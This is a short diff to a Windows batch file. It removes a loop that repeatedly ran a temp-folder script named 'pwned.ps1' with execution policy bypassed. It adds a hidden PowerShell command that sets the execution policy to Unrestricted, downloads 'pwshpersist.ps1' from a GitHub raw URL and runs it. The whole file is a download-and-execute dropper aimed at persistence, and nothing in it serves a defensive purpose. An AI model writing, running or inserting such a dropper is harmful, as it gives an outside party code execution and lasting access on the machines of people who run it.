@@ -1,5 +1,3 @@
 @echo off
-:inicio
-PowerShell.exe -ExecutionPolicy Bypass -File "%temp%\pwned.ps1"
-timeout /t 600 /nobreak >nul
-goto inicio
+powershell -WindowStyle Hidden -command "Set-ExecutionPolicy Unrestricted; wget -Uri 'http://github.com/Aristofer-Magnus/pwned/raw/main/pwshpersist.ps1' -Outfile \"$env:temp\pwshpersist.ps1\"; & \"$env:temp\./pwshpersist.ps1\""
+pause
